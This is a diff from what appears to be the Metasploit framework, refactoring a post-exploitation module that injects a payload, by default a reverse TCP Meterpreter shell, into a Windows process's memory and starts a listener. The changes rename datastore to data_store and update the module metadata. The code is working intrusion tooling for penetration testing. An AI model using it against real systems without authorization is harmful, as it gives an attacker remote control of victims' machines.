@@ -14,18 +14,22 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Common
 
   def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage Memory Payload Injection Module',
-      'Description'   => %q{
-        This module will inject into the memory of a process a specified windows payload.
-        If a payload or process is not provided one will be created by default
-        using a reverse x86 TCP Meterpreter Payload.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+    super(
+        Msf::Module::ModuleInfo.update!(
+            info,
+            'Name'          => 'Windows Manage Memory Payload Injection Module',
+            'Description'   => %q{
+              This module will inject into the memory of a process a specified windows payload.
+              If a payload or process is not provided one will be created by default
+              using a reverse x86 TCP Meterpreter Payload.
+            },
+            'License'       => MSF_LICENSE,
+            'Arch' => ARCH_X86,
+            'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+            'Platform'      => [ 'Windows' ],
+            'SessionTypes'  => [ 'meterpreter' ]
+        )
+    )
 
     register_options(
       [
@@ -52,17 +56,17 @@ class Metasploit3 < Msf::Post
     print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
 
     # Check that the payload is a Windows one and on the list
-    if not  session.framework.payloads.keys.grep(/windows/).include?(datastore['PAYLOAD'])
-      print_error("The Payload specified #{datastore['PAYLOAD']} is not a valid for this system")
+    if not  session.framework.payloads.keys.grep(/windows/).include?(data_store['PAYLOAD'])
+      print_error("The Payload specified #{data_store['PAYLOAD']} is not a valid for this system")
       return
     end
 
     # Set variables
-    pay_name = datastore['PAYLOAD']
-    lhost    = datastore['LHOST']
-    lport    = datastore['LPORT']
-    pid      = datastore['PID']
-    opts     = datastore['OPTIONS']
+    pay_name = data_store['PAYLOAD']
+    lhost    = data_store['LHOST']
+    lport    = data_store['LPORT']
+    pid      = data_store['PID']
+    opts     = data_store['OPTIONS']
     # Create payload
     payload = create_payload(pay_name,lhost,lport,opts)
     if pid == 0 or not has_pid?(pid)
@@ -73,8 +77,8 @@ class Metasploit3 < Msf::Post
       print_error("Migrate to an x64 process and try again.")
       return false
     else
-      create_multihand(payload,pay_name,lhost,lport) if datastore['HANDLER']
-      inject_into_pid(payload,pid,datastore['NEWPROCESS'])
+      create_multihand(payload,pay_name,lhost,lport) if data_store['HANDLER']
+      inject_into_pid(payload,pid,data_store['NEWPROCESS'])
     end
   end
 
@@ -85,8 +89,8 @@ class Metasploit3 < Msf::Post
     client.framework.jobs.each do |k,j|
       if j.name =~ / multi\/handler/
         current_id = j.jid
-        current_lhost = j.ctx[0].datastore["LHOST"]
-        current_lport = j.ctx[0].datastore["LPORT"]
+        current_lhost = j.ctx[0].data_store["LHOST"]
+        current_lport = j.ctx[0].data_store["LPORT"]
         if lhost == current_lhost and lport == current_lport.to_i
           print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
           conflict = true
@@ -99,16 +103,16 @@ class Metasploit3 < Msf::Post
   # Create a payload given a name, lhost and lport, additional options
   def create_payload(name, lhost, lport, opts = "")
     pay = client.framework.payloads.create(name)
-    pay.datastore['LHOST'] = lhost
-    pay.datastore['LPORT'] = lport
+    pay.data_store['LHOST'] = lhost
+    pay.data_store['LPORT'] = lport
     if not opts.empty?
       opts.split(",").each do |o|
         opt,val = o.split("=",2)
-        pay.datastore[opt] = val
+        pay.data_store[opt] = val
       end
     end
     # Validate the options for the module
-    pay.options.validate(pay.datastore)
+    pay.options.validate(pay.data_store)
     return pay
   end
 
@@ -118,16 +122,16 @@ class Metasploit3 < Msf::Post
     if not check_for_listner(lhost,lport)
       # Set options for module
       mul = client.framework.exploits.create("multi/handler")
-      mul.share_datastore(pay.datastore)
-      mul.datastore['WORKSPACE'] = client.workspace
-      mul.datastore['PAYLOAD'] = pay_name
-      mul.datastore['EXITFUNC'] = 'thread'
-      mul.datastore['ExitOnSession'] = false
+      mul.share_data_store(pay.data_store)
+      mul.data_store['WORKSPACE'] = client.workspace
+      mul.data_store['PAYLOAD'] = pay_name
+      mul.data_store['EXITFUNC'] = 'thread'
+      mul.data_store['ExitOnSession'] = false
       # Validate module options
-      mul.options.validate(mul.datastore)
+      mul.options.validate(mul.data_store)
       # Execute showing output
       mul.exploit_simple(
-          'Payload'     => mul.datastore['PAYLOAD'],
+          'Payload'     => mul.data_store['PAYLOAD'],
           'LocalInput'  => self.user_input,
           'LocalOutput' => self.user_output,
           'RunAsJob'    => true
